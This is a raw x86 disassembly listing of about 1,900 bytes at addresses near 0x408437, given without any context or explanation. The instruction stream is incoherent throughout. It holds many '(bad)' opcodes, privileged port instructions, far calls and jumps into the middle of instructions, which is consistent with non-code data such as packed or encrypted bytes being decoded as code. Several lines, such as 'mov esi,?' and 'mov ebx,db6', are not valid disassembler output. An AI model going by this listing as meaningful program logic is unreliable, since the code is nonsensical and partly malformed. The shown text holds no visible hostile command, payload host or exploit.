  408437:	(bad)  
  408438:	out    dx,eax
  408439:	xchg   esp,eax
  40843a:	pop    ds
  40843b:	inc    edi
  40843c:	and    DWORD PTR ds:0xc9af5ae7,ebx
  408442:	jno    0x408414
  408444:	sbb    al,0x16
  408446:	push   ebp
  408447:	lods   al,BYTE PTR ds:[esi]
  408448:	in     al,dx
  408449:	aad    0xca
  40844b:	scas   eax,DWORD PTR es:[edi]
  40844c:	xor    eax,0xec1ab4f0
  408451:	jp     0x4083fd
  408453:	pop    ecx
  408454:	mov    ebx,db6
  408457:	cmp    ah,BYTE PTR [ebx-0x6a]
  40845a:	(bad)  
  40845b:	dec    esp
  40845c:	cmp    ecx,edi
  40845e:	inc    edx
  40845f:	imul   DWORD PTR [ebx]
  408461:	sub    DWORD PTR [ecx-0x8],edx
  408464:	inc    esi
  408465:	test   eax,0xe148e3cd
  40846a:	pusha  
  40846b:	(bad)
  40846f:	rcl    edx,cl
  408471:	les    ebx,FWORD PTR [edi+0x4e]
  408474:	or     BYTE PTR [eax-0x4f0dd3eb],cl
  40847a:	dec    edx
  40847b:	fdivr  st(2),st
  40847d:	(bad)  
  40847e:	cld    
  40847f:	lods   al,BYTE PTR ds:[esi]
  408480:	aad    0xab
  408482:	mov    esi,?
  408484:	stc    
  408485:	cmp    BYTE PTR [ebp+0x11ab166e],0x62
  40848c:	push   eax
  40848d:	es popa 
  40848f:	mov    al,0xe
  408491:	mov    edx,0x9337c346
  408496:	mov    esi,0x5b61494e
  40849b:	mov    eax,ds:0xddeba205
  4084a0:	mov    WORD PTR fs:[edi-0x4c],fs
  4084a4:	jb     0x4084bb
  4084a6:	fist   WORD PTR [ebp+edx*4+0x56]
  4084aa:	inc    ecx
  4084ab:	mov    eax,ds:0x33578d6f
  4084b0:	xor    esi,DWORD PTR ds:0xa704b96e
  4084b6:	jp     0x4084f6
  4084b8:	popf   
  4084b9:	arpl   WORD PTR [edi-0x695e57f1],cx
  4084bf:	xchg   ebx,eax
  4084c0:	xor    al,0x71
  4084c2:	stc    
  4084c3:	mov    esi,0x968acfa0
  4084c8:	sbb    ebp,DWORD PTR ds:0x47d207ac
  4084ce:	mov    eax,ds:0x8ff1801
  4084d3:	sbb    BYTE PTR [eax],al
  4084d5:	fsub   DWORD PTR [edx-0x8]
  4084d8:	loopne 0x408468
  4084da:	das    
  4084db:	imul   edx,ebp,0x14ca11ae
  4084e1:	in     al,0x84
  4084e3:	sbb    edx,DWORD PTR gs:[ecx]
  4084e6:	jnp    0x4084a7
  4084e8:	scas   al,BYTE PTR es:[edi]
  4084e9:	inc    eax
  4084ea:	enter  0x4cb9,0x9c
  4084ee:	mov    ds:0x9c6ef63f,eax
  4084f3:	dec    ecx
  4084f4:	mov    esi,0xa72ae3b0
  4084f9:	daa    
  4084fa:	test   ecx,esi
  4084fc:	loope  0x4084ef
  4084fe:	aas    
  4084ff:	and    bp,WORD PTR [ecx+0x796357ac]
  408506:	push   esp
  408507:	jle    0x408491
  408509:	jp     0x408496
  40850b:	cmc    
  40850c:	nop
  40850d:	xlat   BYTE PTR ds:[ebx]
  40850f:	or     BYTE PTR [ebx],ch
  408511:	mov    ah,0xd4
  408513:	pop    eax
  408514:	add    BYTE PTR [edi],ch
  408516:	mov    edx,DWORD PTR [esi-0x2c]
  408519:	loop   0x4084ab
  40851b:	in     al,0xda
  40851d:	or     eax,0xf8346498
  408522:	or     DWORD PTR [edi+ebp*4-0x2c],edi
  408526:	ret    
  408527:	jb     0x4084e8
  408529:	ds jle 0x408515
  40852c:	or     dl,ch
  40852e:	scas   eax,DWORD PTR es:[edi]
  40852f:	cmp    eax,0x9d8e49af
  408534:	adc    ecx,DWORD PTR [ecx]
  408536:	ins    BYTE PTR es:[edi],dx
  408537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408538:	mov    al,ds:0x55c7d88b
  40853d:	ins    BYTE PTR es:[edi],dx
  40853e:	mov    al,0xb4
  408540:	dec    esp
  408541:	add    dh,0x59
  408544:	add    eax,DWORD PTR [esi]
  408546:	xlat   BYTE PTR ds:[ebx]
  408547:	pop    esp
  408548:	and    eax,0xaa78c505
  40854d:	in     eax,0xce
  40854f:	cmp    DWORD PTR [edx+0x2f8cc43e],0x5cdb371a
  408559:	inc    edi
  40855a:	rcr    BYTE PTR [bx-0x64],1
  40855e:	ins    BYTE PTR es:[edi],dx
  40855f:	test   cl,ah
  408561:	test   BYTE PTR [edi],ah
  408563:	(bad)  
  408564:	out    dx,al
  408565:	dec    edi
  408566:	pop    ebp
  408567:	(bad)  
  408568:	push   0x76
  40856a:	int    0x12
  40856c:	mov    DWORD PTR [edx-0x1c80f249],edx
  408572:	mov    ah,0x2
  408574:	sahf   
  408575:	cmp    dl,BYTE PTR [eax-0x3b]
  408578:	xor    ecx,0xffffff88
  40857b:	adc    DWORD PTR [ecx+eax*1-0x15d01b99],ebx
  408582:	xchg   DWORD PTR [edi-0x780190d5],eax
  408588:	enter  0x243b,0x19
  40858c:	test   al,0xc3
  40858e:	out    dx,al
  40858f:	mov    bl,0x4d
  408591:	mov    ebx,0x82bf66ac
  408596:	data16 data16 and BYTE PTR [edx+edi*4-0x352a9508],cl
  40859f:	cmp    ah,BYTE PTR ds:0xee6b4a15
  4085a5:	xor    DWORD PTR [ecx],edx
  4085a7:	fbstp  TBYTE PTR [eax]
  4085a9:	push   es
  4085aa:	jp     0x408546
  4085ac:	xchg   edi,ebx
  4085ae:	(bad)  
  4085b0:	mov    bh,0x53
  4085b2:	pop    ebx
  4085b3:	jae    0x4085d8
  4085b5:	jns    0x4085d8
  4085b7:	aad    0x51
  4085b9:	sub    eax,0x31d60b81
  4085be:	adc    edi,DWORD PTR [edx+0x5f]
  4085c1:	mov    edx,0x9012fa6d
  4085c6:	sti    
  4085c7:	add    eax,0x6b1208ed
  4085cc:	and    dh,BYTE PTR [ebx-0x53632704]
  4085d2:	or     ch,BYTE PTR [ebx+0x26ac4f95]
  4085d8:	push   0xffffff91
  4085da:	fsubr  QWORD PTR [ecx+0xc]
  4085dd:	bound  ebp,QWORD PTR [edi+ebp*1-0x62]
  4085e1:	dec    esp
  4085e2:	jb     0x408602
  4085e4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4085e6:	dec    ebp
  4085e7:	clc    
  4085e8:	call   0x5d4aa6f2
  4085ed:	jo     0x408649
  4085ef:	fs jecxz 0x408583
  4085f2:	and    ch,BYTE PTR [ecx+0x51]
  4085f5:	adc    BYTE PTR [edi],0x3
  4085f8:	lock mov BYTE PTR [eax+0x6e3007c2],ch
  4085ff:	xlat   BYTE PTR ds:[ebx]
  408600:	mov    bh,0x1f
  408602:	sbb    al,0xeb
  408604:	xlat   BYTE PTR ds:[ebx]
  408605:	xchg   ebp,ebx
  408607:	mov    WORD PTR [ecx],cs
  408609:	pop    ss
  40860a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40860b:	js     0x4085d5
  40860d:	mov    dl,0x78
  40860f:	mov    fs,di
  408612:	js     0x4085d3
  408614:	in     eax,0xdd
  408616:	sbb    eax,DWORD PTR [ecx-0x7c]
  408619:	dec    edi
  40861a:	jo     0x408678
  40861c:	xor    bh,ch
  40861e:	dec    edx
  40861f:	daa    
  408620:	or     al,0xf8
  408622:	jns    0x4085da
  408624:	sbb    al,0x6c
  408626:	shl    DWORD PTR [edi+0x31],1
  408629:	jmp    0x4085c3
  40862b:	add    ebp,DWORD PTR [edi-0x4f873412]
  408631:	mov    edx,0xe2962612
  408636:	jmp    0x32949223
  40863b:	cmp    BYTE PTR [ebp+0x5],bh
  40863e:	cmc    
  40863f:	xchg   ecx,eax
  408640:	bound  esp,QWORD PTR cs:[eax]
  408643:	sub    eax,0xf134612e
  408648:	inc    ecx
  408649:	or     BYTE PTR [edx+0x4e],bh
  40864c:	sbb    eax,0xd1857913
  408651:	cmp    cl,BYTE PTR [ecx-0x39915b50]
  408657:	in     al,0x68
  408659:	jns    0x4085fd
  40865b:	jmp    0x408637
  40865d:	inc    ebx
  40865e:	mov    ah,BYTE PTR [ebp-0x7f]
  408661:	es jns 0x4086be
  408664:	ret    
  408665:	push   edx
  408666:	push   ss
  408667:	adc    bh,BYTE PTR [esp+eax*1-0x31]
  40866b:	inc    ecx
  40866c:	fldenv [ecx-0x465ec27d]
  408672:	jecxz  0x4086e4
  408674:	mov    edx,ebx
  408676:	mov    dh,0x22
  408678:	pop    edi
  408679:	(bad)  [edi]
  40867b:	dec    ebx
  40867c:	adc    dl,bl
  40867e:	jp     0x408670
  408680:	fisttp DWORD PTR [ecx]
  408682:	cld    
  408683:	mov    bl,0x91
  408685:	repnz hlt 
  408687:	fisub  DWORD PTR [ebx-0x71]
  40868a:	addr16 addr16 mov edx,0x47edcae2
  408691:	out    dx,al
  408692:	mul    DWORD PTR [eax+0x744a9a3f]
  408698:	add    al,0x2f
  40869a:	dec    ebx
  40869b:	lahf   
  40869c:	push   0xc7786ca8
  4086a1:	into   
  4086a2:	jnp    0x40871d
  4086a4:	inc    edx
  4086a5:	mov    edi,0xc39f15b5
  4086aa:	ret    0xc863
  4086ad:	xor    esi,edi
  4086af:	int3   
  4086b0:	add    al,0x3c
  4086b2:	inc    ecx
  4086b3:	add    dl,cl
  4086b5:	inc    ebp
  4086b6:	jp     0x40865d
  4086b8:	push   edx
  4086b9:	iret   
  4086ba:	mov    cl,0x9a
  4086bc:	push   ebp
  4086bd:	loope  0x408717
  4086bf:	mov    edi,ss
  4086c1:	pop    ss
  4086c2:	pop    esi
  4086c3:	inc    eax
  4086c4:	in     eax,dx
  4086c5:	inc    esi
  4086c6:	push   0x4e836e46
  4086cb:	in     eax,0x54
  4086cd:	mov    ch,0x57
  4086cf:	jge    0x408740
  4086d1:	and    dl,BYTE PTR [eax-0xd]
  4086d4:	ret    
  4086d5:	sub    al,0xca
  4086d8:	sub    ch,bh
  4086da:	pop    edx
  4086db:	inc    eax
  4086dc:	push   ecx
  4086dd:	dec    eax
  4086de:	test   BYTE PTR [edx],dh
  4086e0:	xchg   ebx,eax
  4086e1:	inc    edi
  4086e2:	jns    0x408683
  4086e4:	mov    ch,0xcc
  4086e6:	push   cs
  4086e7:	scas   eax,DWORD PTR es:[edi]
  4086e8:	mov    cl,BYTE PTR [ebp+0x5a]
  4086eb:	std    
  4086ec:	nop
  4086ed:	aam    0x4
  4086ef:	jle    0x408688
  4086f1:	add    esi,DWORD PTR [edx+0x136ef0f2]
  4086f7:	add    dl,BYTE PTR [edx]
  4086f9:	outs   dx,BYTE PTR ds:[esi]
  4086fa:	adc    DWORD PTR [ecx+ebp*4-0x31],ebp
  4086fe:	or     esp,eax
  408700:	fldenv [ecx-0x2e]
  408703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408704:	cmp    cl,dh
  408706:	(bad)
  408709:	add    eax,0x158be6e
  40870e:	jne    0x408708
  408710:	xchg   ebx,eax
  408711:	mov    bh,0x40
  408713:	mov    ds:0xd4edaa9e,eax
  408718:	sbb    esi,DWORD PTR [ebx-0x18]
  40871b:	lock call 0x54d3:0xbb407cda
  408723:	lods   al,BYTE PTR ds:[esi]
  408724:	(bad)  [ebx]
  408726:	into   
  408727:	cmp    eax,edx
  408729:	mov    ch,dh
  40872b:	bound  edx,QWORD PTR [ebp+eiz*2-0x40056023]
  408732:	cwde   
  408733:	mov    cs,WORD PTR [esp+ecx*1-0x69]
  408737:	xchg   ecx,eax
  408738:	mov    cl,0x31
  40873a:	pop    ebx
  40873b:	jg     0x4086f8
  40873d:	mov    edx,ecx
  40873f:	lock hlt 
  408741:	ins    BYTE PTR es:[edi],dx
  408742:	xor    BYTE PTR [ecx-0x62ce435e],bl
  408748:	imul   esi,DWORD PTR [eax],0xed5f5369
  40874e:	cmp    edx,eax
  408750:	mov    cl,0xd6
  408752:	lock jns 0x4086fc
  408755:	pop    ebp
  408756:	fs mov esi,0x362a69d4
  40875c:	dec    ebx
  40875d:	das    
  40875e:	jge    0x40877f
  408760:	mov    bh,0xc8
  408762:	ins    BYTE PTR es:[edi],dx
  408763:	cmp    dh,ch
  408765:	xor    dh,BYTE PTR [ecx]
  408767:	in     al,0xc0
  408769:	inc    edx
  40876a:	sub    al,0xba
  40876c:	xor    ecx,DWORD PTR [eax]
  40876e:	inc    ebx
  40876f:	mov    esp,0x8821b5bd
  408774:	push   edi
  408775:	inc    eax
  408776:	cmc    
  408777:	into   
  408778:	fcmovnb st,st(2)
  40877a:	adc    esi,DWORD PTR [edx-0x42]
  40877d:	cmp    BYTE PTR [ebx-0x562e9d15],bh
  408783:	imul   edx,edi,0x8dbc06a4
  408789:	test   BYTE PTR [ebx+ebp*2-0x7b8a8c7b],bh
  408790:	dec    esi
  408791:	sbb    al,0xf5
  408793:	out    dx,eax
  408794:	mov    ds:0x91d275af,eax
  408799:	mov    dl,cl
  40879b:	and    bh,BYTE PTR [ebp+0xe51e78f]
  4087a1:	and    esp,DWORD PTR [eax+0x20]
  4087a4:	sub    ah,bh
  4087a6:	dec    esi
  4087a7:	inc    ebp
  4087a8:	call   0xbacc2594
  4087ad:	aad    0xbf
  4087af:	mov    edx,DWORD PTR [ebx]
  4087b1:	jl     0x408773
  4087b3:	adc    eax,0xc6c746fb
  4087b8:	jge    0x40879a
  4087ba:	jne    0x408770
  4087bc:	push   edx
  4087bd:	dec    edi
  4087be:	sar    DWORD PTR [eax+0x332aba15],cl
  4087c4:	cmc    
  4087c5:	mov    esi,0xe6fef146
  4087ca:	and    al,0x11
  4087cc:	sub    eax,0xb857c471
  4087d1:	mov    ds:0xa14f899c,al
  4087d6:	dec    edx
  4087d7:	xchg   ebx,eax
  4087d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d9:	lahf   
  4087da:	jnp    0x408857
  4087dc:	jnp    0x408768
  4087de:	sbb    DWORD PTR [ecx+0x19],ecx
  4087e1:	cmp    cl,BYTE PTR [ecx-0x2efa05ef]
  4087e7:	and    DWORD PTR [esi-0x5d],0xae114192
  4087ee:	(bad)  
  4087ef:	adc    eax,0x87a049e8
  4087f4:	(bad)  
  4087f5:	imul   eax,DWORD PTR [ebx+0x7f3f2a14],0x8e9e7984
  4087ff:	sbb    bh,bh
  408801:	nop
  408802:	cwde   
  408803:	cmp    eax,0xa5039054
  408808:	imul   BYTE PTR [esi+0x20]
  40880b:	mov    ebp,0x35b21461
  408810:	xchg   edi,eax
  408811:	mov    edi,0xd5a7415c
  408816:	fwait
  408817:	mov    esi,0x9f1d81d
  40881c:	ds pop ds
  40881e:	(bad)  
  40881f:	sbb    DWORD PTR [edi],esp
  408821:	(bad)  
  408822:	aaa    
  408823:	iret   
  408824:	xchg   DWORD PTR [ebx+0x6c9818fd],esp
  40882a:	dec    ah
  40882c:	in     eax,0x1b
  40882e:	fwait
  40882f:	lods   al,BYTE PTR ds:[esi]
  408830:	pop    eax
  408831:	frstor [eax+0x4c]
  408834:	or     esp,DWORD PTR [ebp+0x6bf404df]
  40883a:	cmp    BYTE PTR [eax-0x14269d95],ch
  408840:	out    0x1d,eax
  408842:	outs   dx,DWORD PTR ds:[esi]
  408843:	mov    al,ds:0xd5b35fe5
  408848:	mov    edi,0x15aa4f30
  40884d:	retf   
  40884e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40884f:	scas   al,BYTE PTR es:[edi]
  408850:	jno    0x4088cc
  408852:	test   BYTE PTR [esi],al
  408854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408855:	adc    eax,0x85fa3dc6
  40885a:	mov    eax,ds:0xbf074188
  40885f:	push   ebx
  408860:	jp     0x408898
  408862:	fsubr  st,st(2)
  408864:	mov    esi,0xe791369
  408869:	loopne 0x40880f
  40886b:	out    dx,al
  40886c:	mov    ch,0xc3
  40886e:	pusha  
  40886f:	imul   ecx,DWORD PTR [esi+0x26],0x4d
  408873:	les    esi,FWORD PTR [ebp+0x7299485d]
  408879:	sbb    DWORD PTR [esi+0x71e9a493],edx
  40887f:	lock outs dx,DWORD PTR ds:[esi]
  408881:	dec    edi
  408882:	mov    eax,0x7fc2335b
  408887:	mov    esp,0xc7fb855e
  40888c:	(bad)  
  40888e:	xor    ecx,esi
  408890:	call   0xa7fdeba1
  408895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408896:	popa   
  408897:	popa   
  408898:	repz dec ebx
  40889a:	stos   BYTE PTR es:[edi],al
  40889b:	aad    0x38
  40889d:	addr16 jbe 0x4088c7
  4088a0:	test   eax,0xf2903b7a
  4088a5:	test   BYTE PTR [ebp-0x44],ch
  4088a8:	icebp  
  4088a9:	add    eax,0xeb82f04a
  4088ae:	in     eax,0xd8
  4088b0:	pop    ebx
  4088b1:	add    esi,DWORD PTR [ebx+0x29df7b44]
  4088b7:	in     eax,dx
  4088b8:	in     al,dx
  4088b9:	daa    
  4088ba:	push   eax
  4088bb:	aaa    
  4088bc:	cmp    ah,dh
  4088be:	and    ebp,DWORD PTR [eax-0x6]
  4088c1:	xlat   BYTE PTR ds:[ebx]
  4088c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088c3:	imul   ecx,esp,0x12
  4088c6:	pop    ebx
  4088c7:	adc    bh,BYTE PTR cs:[esi+0x30308920]
  4088ce:	push   esi
  4088cf:	aas    
  4088d0:	push   cs
  4088d1:	adc    al,0x55
  4088d3:	inc    edx
  4088d4:	jp     0x40887b
  4088d6:	mov    esp,0xc58086c8
  4088db:	out    dx,eax
  4088dc:	ss jmp 0xa47051d4
  4088e2:	add    eax,0x6c56fb64
  4088e7:	mov    ch,0x25
  4088e9:	mul    DWORD PTR [eax]
  4088eb:	cmc    
  4088ec:	mov    al,0xe7
  4088ee:	or     al,dl
  4088f0:	mov    cl,0xe1
  4088f2:	mov    ds:0x4cfc2962,eax
  4088f7:	test   DWORD PTR [ecx-0x58822de1],esi
  4088fd:	das    
  4088fe:	jno    0x40894e
  408900:	adc    eax,0x93403771
  408905:	inc    esp
  408906:	xor    bh,BYTE PTR [esi]
  408908:	mov    ebp,0x6e8cf4ea
  40890d:	call   0xe6c26322
  408912:	je     0x408939
  408914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408915:	mov    DWORD PTR [eax+0x4b],ebx
  408918:	pop    esi
  408919:	and    bl,dl
  40891b:	mul    DWORD PTR [edi]
  40891d:	xor    al,0xdb
  40891f:	cmp    DWORD PTR [ebx-0x4fecc341],edi
  408925:	push   ebp
  408926:	jo     0x40890f
  408928:	ds sbb al,0x70
  40892b:	jmp    0xb2ef:0x23d5d6a1
  408932:	cli    
  408933:	(bad)  
  408934:	cmp    edx,DWORD PTR [eax]
  408936:	in     al,dx
  408937:	arpl   sp,sp
  408939:	jg     0x4089b6
  40893b:	jecxz  0x4088d2
  40893d:	push   0x71
  40893f:	dec    ebx
  408940:	add    BYTE PTR [esi],0xa7
  408943:	jae    0x40898c
  408945:	repnz bound ebp,QWORD PTR [edi]
  408948:	mov    DWORD PTR [eax],ebx
  40894a:	xor    al,0x5b
  40894c:	lea    ebp,[esi-0x10e86003]
  408952:	scas   eax,DWORD PTR es:[edi]
  408953:	ja     0x40893b
  408955:	or     al,0x28
  408957:	dec    DWORD PTR [esi+0x43]
  40895a:	loopne 0x40890b
  40895c:	push   ds
  40895d:	stos   DWORD PTR es:[edi],eax
  40895e:	test   al,0x56
  408960:	iret   
  408961:	inc    ebp
  408962:	push   edx
  408963:	sbb    BYTE PTR [edi+0x6bda9ecc],al
  408969:	xlat   BYTE PTR ds:[ebx]
  40896a:	or     al,0xec
  40896c:	test   al,0x34
  40896e:	mov    ebx,0x4aa30773
  408973:	lods   eax,DWORD PTR ds:[esi]
  408974:	mov    WORD PTR [esi],gs
  408976:	jmp    0x4089d4
  408978:	push   0x61
  40897a:	inc    esp
  40897b:	sbb    esp,esp
  40897d:	sub    al,0xc6
  40897f:	add    ebp,DWORD PTR [edx-0x73e5842a]
  408985:	lods   eax,DWORD PTR ds:[esi]
  408986:	call   0x52f6c3e9
  40898b:	je     0x40896a
  40898d:	xchg   ebp,eax
  40898e:	les    esi,FWORD PTR [esi+0x94e390b]
  408994:	xlat   BYTE PTR ds:[ebx]
  408995:	mov    bh,0x4f
  408997:	pop    ebp
  408998:	cld    
  408999:	sub    esi,DWORD PTR [edx+0x9900da7]
  40899f:	pusha  
  4089a0:	cld    
  4089a1:	mov    ds:0x4f9a1667,eax
  4089a6:	jmp    0x40897b
  4089a8:	rep ins DWORD PTR es:[edi],dx
  4089aa:	pop    ebx
  4089ab:	mov    gs,WORD PTR [esp+esi*8+0x6a2de4fe]
  4089b2:	fs add eax,0x9a10be83
  4089b8:	xchg   esp,eax
  4089b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089ba:	imul   eax,DWORD PTR [ebp+0x7],0x6f
  4089be:	dec    edx
  4089bf:	cmp    ebx,DWORD PTR [edx+0x67]
  4089c2:	das    
  4089c3:	jp     0x408965
  4089c5:	mov    WORD PTR [ebp-0x58],ds
  4089c8:	inc    edi
  4089c9:	adc    dl,ah
  4089cb:	fild   DWORD PTR [eax+0x1f]
  4089ce:	or     dh,0x9
  4089d1:	push   esi
  4089d2:	inc    esi
  4089d3:	inc    eax
  4089d4:	test   al,0x6b
  4089d6:	fist   WORD PTR [ecx+0x3b3985a9]
  4089dc:	aaa    
  4089dd:	or     eax,0xebb811bd
  4089e2:	enter  0x11f0,0x5f
  4089e6:	ret    0x426b
  4089e9:	sbb    ecx,edi
  4089eb:	add    edx,DWORD PTR [ecx+ecx*8+0x163eefe3]
  4089f2:	ficom  DWORD PTR [eax-0x46dfa0a0]
  4089f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089f9:	adc    BYTE PTR [esi],0xef
  4089fc:	jge    0x4089fb
  4089fe:	cmp    cl,BYTE PTR [edx+0x555efa25]
  408a04:	mov    ds:0x8e0012f5,al
  408a09:	sti    
  408a0a:	mov    edi,0xd3007961
  408a0f:	bound  esi,QWORD PTR [ebp-0xc]
  408a12:	inc    esp
  408a13:	pop    ebx
  408a14:	ins    DWORD PTR es:[edi],dx
  408a15:	mov    BYTE PTR [esi+0x68],bh
  408a18:	mov    dh,0x8a
  408a1a:	mov    esp,?
  408a1c:	fldpi  
  408a1e:	adc    esi,DWORD PTR [ebp-0x3f0f6ea2]
  408a24:	sub    eax,0xa10e9926
  408a29:	sub    ah,dh
  408a2b:	pop    edx
  408a2c:	adc    BYTE PTR [edx],ah
  408a2e:	cwde   
  408a2f:	sub    DWORD PTR [edi],edx
  408a31:	(bad)  
  408a32:	not    BYTE PTR [ecx]
  408a34:	imul   esp,DWORD PTR [edx+0x780b09da],0xffffffa5
  408a3b:	push   0x38391ded
  408a40:	je     0x4089fa
  408a42:	rcr    BYTE PTR [eax-0x67],0x85
  408a46:	mov    ebp,0x6fc8d6e9
  408a4b:	call   0xd21e:0x2de7851
  408a52:	and    ah,BYTE PTR [esi]
  408a54:	push   es
  408a55:	dec    esi
  408a56:	sti    
  408a57:	push   cs
  408a58:	les    ebp,FWORD PTR [edi+0x62]
  408a5b:	dec    ebx
  408a5c:	shl    BYTE PTR [eax-0x52],cl
  408a5f:	push   ss
  408a60:	aas    
  408a61:	xchg   edi,eax
  408a62:	xor    al,0x38
  408a64:	mov    ecx,0x33869806
  408a69:	popf   
  408a6a:	push   0xca6b633a
  408a6f:	dec    ecx
  408a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a71:	jl     0x408a5b
  408a73:	fdivr  DWORD PTR ss:[edx+0x530529ea]
  408a7a:	mov    ah,0x5b
  408a7c:	jl     0x408ae7
  408a7e:	and    eax,0x9e6aad5f
  408a83:	inc    edx
  408a84:	mov    ch,BYTE PTR [ebx]
  408a86:	pop    ecx
  408a87:	push   ss
  408a88:	in     eax,0xce
  408a8a:	pop    ecx
  408a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a8c:	mov    al,BYTE PTR [edi]
  408a8e:	pop    ebp
  408a8f:	mov    edx,?
  408a91:	mov    edx,0xa7d02dbc
  408a96:	clc    
  408a97:	sbb    eax,0x10360920
  408a9c:	das    
  408a9d:	or     eax,0xe4d8c4e2
  408aa2:	adc    ebp,DWORD PTR [ecx]
  408aa4:	ds push es
  408aa6:	jo     0x408ab4
  408aa8:	(bad)  
  408aaa:	and    cl,BYTE PTR [ecx+ebx*2]
  408aad:	retf   
  408aae:	arpl   WORD PTR [edi+eiz*1],bp
  408ab1:	ret    
  408ab2:	and    ch,BYTE PTR [ebx+edi*2-0x2e3a8f0f]
  408ab9:	fwait
  408aba:	inc    ebx
  408abb:	retf   
  408abc:	xchg   ecx,eax
  408abd:	daa    
  408abe:	mov    esp,0x8a80c8f9
  408ac3:	pop    esi
  408ac4:	test   eax,0xd853510a
  408ac9:	das    
  408aca:	push   edi
  408acb:	mov    al,0x3c
  408acd:	cmp    BYTE PTR [ebp+ebp*2+0x1d541558],cl
  408ad4:	cld    
  408ad5:	adc    BYTE PTR [eax],bh
  408ad7:	ja     0x408a6f
  408ad9:	pop    ebx
  408ada:	xor    al,0x93
  408adc:	int3   
  408add:	sbb    DWORD PTR [edi-0x562abf22],ebx
  408ae3:	mov    dl,0xac
  408ae5:	lods   eax,DWORD PTR ds:[esi]
  408ae6:	scas   eax,DWORD PTR es:[edi]
  408ae7:	cs out dx,eax
  408ae9:	jns    0x408aca
  408aeb:	dec    eax
  408aec:	in     al,0xcc
  408aee:	je     0x408af3
  408af0:	and    eax,0x8e816aeb
  408af5:	and    DWORD PTR ds:0xbb63020e,0x7b
  408afc:	arpl   WORD PTR [edi-0x2df20895],bp
  408b02:	out    0x4c,al
  408b04:	jp     0x408a99
  408b06:	cs jne 0x408ac3
  408b09:	loope  0x408b64
  408b0b:	push   es
  408b0c:	xchg   edi,eax
  408b0d:	loopne 0x408b3b
  408b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b10:	dec    esp
  408b11:	push   esi
  408b12:	dec    esi
  408b13:	pop    ecx
  408b14:	sub    al,BYTE PTR [edx+0x3b86a7c5]
  408b1a:	outs   dx,BYTE PTR ds:[esi]
  408b1b:	scas   eax,DWORD PTR es:[edi]
  408b1c:	inc    edx
  408b1d:	popa   
  408b1e:	mov    dl,0x9c
  408b20:	scas   eax,DWORD PTR es:[edi]
  408b21:	mov    eax,0x142bcc32
  408b26:	je     0x408abe
  408b28:	cwde   
  408b29:	inc    ebx
  408b2a:	loopne 0x408adf
  408b2c:	mov    BYTE PTR [eax-0x12787b77],ch
  408b32:	mov    BYTE PTR [esi],dl
  408b34:	xor    DWORD PTR [esi+ebp*4],0x4f748813
  408b3b:	or     eax,0x105b1d76
  408b40:	adc    DWORD PTR [ebp-0x2d],ecx
  408b43:	mov    bh,0xba
  408b45:	(bad)  
  408b46:	or     dl,dh
  408b48:	xor    al,0xf0
  408b4a:	aas    
  408b4b:	mov    DWORD PTR [edi-0x6d],0xb74fe605
  408b52:	enter  0xf351,0x2
  408b56:	push   ebx
  408b57:	iret   
  408b58:	or     dh,ah
  408b5a:	ret    
  408b5b:	jge    0x408ae7
  408b5d:	call   0x6624:0xfff5cf8e
  408b64:	std    
  408b65:	fst    QWORD PTR [edi]
  408b67:	mov    eax,0x382d0cb
  408b6c:	fwait
  408b6d:	cmp    eax,0x1790834
  408b72:	xor    al,0x5d
  408b74:	das    
  408b75:	loop   0x408b1e
  408b77:	adc    BYTE PTR [ebx+ecx*1-0x7186cc6b],cl
  408b7e:	jno    0x408b1d
  408b80:	sbb    BYTE PTR [edx],cl
  408b82:	adc    al,0xde
  408b84:	pop    eax
  408b85:	ret    
  408b86:	dec    ecx
  408b87:	jbe    0x408bbb
  408b89:	stos   DWORD PTR es:[edi],eax
  408b8a:	mov    WORD PTR [ecx+0x7a],es
  408b8d:	repnz add dl,BYTE PTR [si]
  408b91:	int3   
  408b92:	scas   al,BYTE PTR es:[edi]
  408b93:	or     ah,BYTE PTR [eax-0x73]
  408b96:	sbb    al,0xc9
  408b98:	fild   QWORD PTR [ecx+ebx*8+0x3]
  408b9c:	push   ss
  408b9d:	fdiv   st,st(6)
  408b9f:	idiv   dh
  408ba1:	icebp  
  408ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ba3:	aas    
  408ba4:	cmp    BYTE PTR [ebx+0x41],0x68
  408ba8:	inc    edx
  408ba9:	call   0x3a9d:0x41629d33
  408bb0:	add    dh,BYTE PTR [ecx-0x72e356e6]
  408bb6:	(bad)
  408bba:	push   0xe0f50910
  408bbf:	push   edx
  408bc0:	addr16 xchg esp,eax
  408bc2:	lahf   
  408bc3:	hlt    
  408bc4:	lods   al,BYTE PTR ds:[esi]
  408bc5:	lods   al,BYTE PTR ds:[esi]
  408bc6:	pop    ecx
  408bc7:	into   
  408bc8:	jnp    0x408c06
  408bca:	stos   BYTE PTR es:[edi],al
  408bcb:	ds xor eax,0xe55427b6
  408bd1:	mov    DWORD PTR [eax+eax*2],edi
  408bd4:	adc    ch,ch
  408bd6:	and    DWORD PTR [ecx],edx
  408bd8:	mov    ah,BYTE PTR [esi+0x4c1c87b7]
  408bde:	out    dx,eax
  408bdf:	adc    DWORD PTR [edi-0x44025e69],edx
  408be5:	sub    eax,0x46ecd666
  408bea:	(bad)  
  408beb:	mov    al,ds:0xb3dcdc7a
  408bf0:	pusha  
  408bf1:	xchg   ebx,eax
  408bf2:	mov    edi,0xe8d93e58
  408bf7:	test   BYTE PTR [esi],0x63
  408bfa:	lds    esi,FWORD PTR [eax-0x8]
  408bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bfe:	push   cs
  408bff:	test   al,0x3
  408c01:	jle    0x408c00
